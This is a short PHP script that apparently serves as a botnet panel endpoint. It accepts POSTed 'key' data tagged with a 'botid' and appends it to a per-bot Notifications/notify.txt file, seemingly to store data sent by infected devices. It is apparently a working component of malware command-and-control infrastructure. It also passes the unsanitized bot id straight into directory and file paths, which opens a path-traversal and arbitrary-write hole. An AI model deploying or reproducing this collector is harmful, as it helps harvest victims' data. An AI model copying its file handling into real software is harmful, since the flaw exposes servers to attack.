<?php
              
if(isset($_POST['key']) && $_POST['botid'])
{
$data=$_POST['key'];
$dir=$_POST['botid'];

$path = 'uploads/' . $dir . '/';


if (!is_dir($dir))
 {
    mkdir($dir);
}
			
if (!is_dir($dir.'/Notifications/')) 
{
    mkdir($dir.'/Notifications/');
}


$my_file = 'notify.txt';
$fp = fopen($dir.'/Notifications/'.$my_file, 'a');
fwrite($fp, $data);
fclose($fp);
}
?>